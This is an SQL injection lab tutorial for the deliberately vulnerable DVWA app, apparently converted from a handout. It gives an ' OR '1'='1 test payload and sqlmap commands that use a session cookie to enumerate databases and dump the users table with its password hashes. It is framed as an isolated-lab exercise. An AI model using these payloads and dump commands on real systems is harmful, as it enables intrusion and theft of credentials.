# DVWA SQL Injection Tutorial

**Source:** DVWA_SQLi_Tutorial.docx 【7†source】

> ⚠️ **Disclaimer:** For educational purposes only. Perform exercises only in a controlled lab environment.

## Overview

This lab demonstrates SQL Injection exploitation using **Damn Vulnerable Web Application (DVWA)** and **sqlmap**. Follow the steps below in a safe, isolated environment (e.g., a VM or isolated lab network).

---

## Prerequisites

- DVWA running (e.g., on a VM like Metasploitable or via Docker).
- sqlmap installed.
- A browser to access DVWA (e.g., `http://<DVWA-IP>/dvwa`).

---

## Steps

### Step 1: Verify Connectivity
Ping the Metasploitable (or target) machine to confirm network connectivity.

```bash
ping <Metasploitable-IP>
```

### Step 2: Login to DVWA
Open DVWA in your browser and login using the credentials:

- **Username:** `admin`
- **Password:** `password`

### Step 3: Access DVWA Dashboard
After successful login you should see the DVWA dashboard.

### Step 4: Set Security Level
Navigate to **DVWA Security** and set the security level to **Low**.

### Step 5: Select SQL Injection Module
From the left menu, click **SQL Injection** to open the vulnerable page/module.

### Step 6: Test Injection
In the **User ID** field, enter the following to test for SQL injection vulnerability:

```
' OR '1'='1
```

If the page returns user data, the input is vulnerable to SQL injection.

### Step 7: Injection Results
DVWA will display user data when the test injection is successful, confirming the vulnerability.

### Step 8: Inspect Cookies
Open developer tools:
- Right-click → **Inspect** → **Storage** → **Cookies**.
- Copy `PHPSESSID` value and note `security=low` cookie.

You will use the session cookie with sqlmap to maintain the authenticated session.

### Step 9: Run sqlmap Enumeration
Use sqlmap to enumerate the target. Replace `<IPAddress>` and `<SessionID>` appropriately.

```bash
sqlmap -u "http://<IPAddress>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=<SessionID>; security=low"   --batch --dbs
```

Notes:
- `--batch` runs non-interactively using default answers.
- `--dbs` lists the databases found.

### Step 10: List Tables
To enumerate tables in the `dvwa` database:

```bash
sqlmap -u "http://<IPAddress>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=<SessionID>; security=low"   -D dvwa --tables --batch
```

### Step 11: Dump Users Table
To dump the `users` table:

```bash
sqlmap -u "http://<IPAddress>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=<SessionID>; security=low"   -D dvwa -T users --dump --batch
```

### Step 12: Extracted Data
sqlmap will retrieve usernames, password hashes, and other data from the `users` table if the injection is exploitable.

---

## Notes & Safety
- Do **NOT** expose DVWA to the public internet.
- Only run these tests in controlled environments where you have permission.
- The session cookie (`PHPSESSID`) is sensitive; keep it private during testing.

---

## (Optional) Example Commands Recap

- Enumerate databases:

```bash
sqlmap -u "http://<IPAddress>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=<SessionID>; security=low"   --batch --dbs
```

- List tables in `dvwa`:

```bash
sqlmap -u "http://<IPAddress>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=<SessionID>; security=low"   -D dvwa --tables --batch
```

- Dump `users` table:

```bash
sqlmap -u "http://<IPAddress>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=<SessionID>; security=low"   -D dvwa -T users --dump --batch
```

---

## Acknowledgements
Converted from the original lab handout: `DVWA_SQLi_Tutorial.docx`. See the original for any additional context. 【7†source】
